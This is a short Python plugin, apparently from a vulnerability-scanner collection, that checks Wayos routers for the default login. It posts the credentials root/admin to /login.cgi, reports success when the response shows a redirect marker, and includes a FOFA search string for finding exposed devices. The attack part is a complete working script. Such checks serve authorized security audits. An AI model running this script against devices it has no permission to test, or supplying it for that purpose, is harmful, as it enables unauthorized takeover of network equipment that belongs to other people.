#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '维盟wayos默认口令',

      'level'     :   'high',

      'FOFA'      :   '"wayos"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2023/11/29',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/login.cgi'
  data = 'user=root&password=admin&Submit=%E7%99%BB+%E9%99%86'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and "window.open('index.htm?_" in res.text:
      ret['huixian'] = "root:admin"
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret